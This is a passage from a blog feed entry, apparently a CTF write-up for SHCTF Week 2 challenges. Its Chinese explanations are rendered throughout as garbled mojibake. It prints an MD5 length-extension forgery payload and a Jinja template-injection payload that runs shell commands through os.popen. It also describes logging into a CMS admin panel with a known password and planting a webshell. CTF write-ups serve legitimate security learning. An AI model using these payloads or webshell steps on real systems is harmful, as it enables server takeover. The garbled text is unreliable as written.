class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Input</span> Signature:  <span class="keyword">key</span>å’Œæ˜æ–‡åŠ å¯†åå¾—åˆ°çš„å“ˆå¸Œå€¼</span><br><span class="line"><span class="keyword">Input</span> Data:  ç»™å‡ºçš„æ˜æ–‡</span><br><span class="line"><span class="keyword">Input</span> <span class="keyword">Key</span> <span class="keyword">Length</span>:  <span class="keyword">key</span>çš„é•¿åº¦</span><br><span class="line"><span class="keyword">Input</span> Data to <span class="keyword">Add</span>:  æƒ³è¦æ·»åŠ çš„æ•°å€¼ï¼Œè¿™éƒ¨åˆ†æ˜¯å¿…é¡»å¾—æœ‰çš„ï¼Œå°±ç®—æ²¡ç”¨</span><br><span class="line">æœ€åå¾—åˆ°çš„ç»“æœæ˜¯ç»“åˆæ›´æ–°åå†…å®¹å¾—åˆ°çš„å“ˆå¸Œå€¼</span><br><span class="line">åé¢æ˜¯ä¼ªé€ çš„password</span><br></pre></td></tr></table></figure><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡ŒæŠŠflagçš„æœ€åä¸€ä¸ªå­—ç¬¦&#125;å½“æˆå·²çŸ¥çš„å­—ç¬¦è¿›è¡Œä¼ªé€ æ–°çš„<span class="built_in">md5</span>å€¼ï¼ŒæŠŠå‰©ä¸‹çš„flagå½“ä½œ<span class="built_in">key</span></span><br></pre></td></tr></table></figure><p>ä¸€é˜¶æ®µï¼šè·å¾—flagçš„md5å’Œé•¿åº¦ï¼Œå¼€å§‹å°±æ˜¯ä¸€ä¸ªurlæ‹†åˆ†å¥—å¨ƒ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231015170602470.png" alt="image-20231015170602470"></p><p>äºŒé˜¶æ®µï¼šè¿›è¡Œmd5ä¼ªé€ </p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231015170757186.png" alt="image-20231015170757186"></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¼ å‚çš„æ—¶å€™å»æ‰æœ€å‰é¢çš„&#125;ï¼Œå› ä¸ºçœŸæ­£çš„<span class="built_in">key</span>ï¼ˆflagï¼‰ï¼Œåé¢æ˜¯è‡ªå¸¦ä¸€ä¸ª&#125;çš„</span><br></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?length<span class="operator">=</span><span class="variable">%80</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span>P<span class="variable">%01</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span>a</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">SHCTF<span class="operator">=</span>d<span class="number">285</span><span class="keyword">c</span><span class="number">0</span>becc<span class="number">667923569236</span>d<span class="number">9</span>eed<span class="number">60</span><span class="keyword">c</span><span class="number">79</span></span><br></pre></td></tr></table></figure><h2 id="WEEK2-ez-ssti">[WEEK2]ez_ssti</h2><p>ssti</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">åœ¨hackerbaréšæ‰‹ç‚¹äº†ä¸ªexpå°±getshelläº†</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">?name=</span><span class="template-variable">&#123;&#123;<span class="name">g.pop.__globals__.__builtins__</span>[&#x27;__import__&#x27;](<span class="name">&#x27;os&#x27;</span>).popen(<span class="name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="WEEK2-EasyCMS">[WEEK2]EasyCMS</h2><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç½‘ä¸Šæœåå°ï¼Œ<span class="literal">admin</span>/<span class="literal">admin</span>.phpï¼Œå¯†ç æ˜¯taoï¼Œè¿›å…¥åå°å‘ç°å¯ä»¥ç¼–è¾‘æ–‡ä»¶ï¼Œç›´æ¥å†™ä¸ªé©¬ï¼Œèšå‰‘è¿æ¥ç»“æŸæˆ˜æ–—</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">å±±æ²³CTFï¼Œæ„Ÿè°¢ä¸»åŠæ–¹</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="æ¯”èµ›WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
</feed>
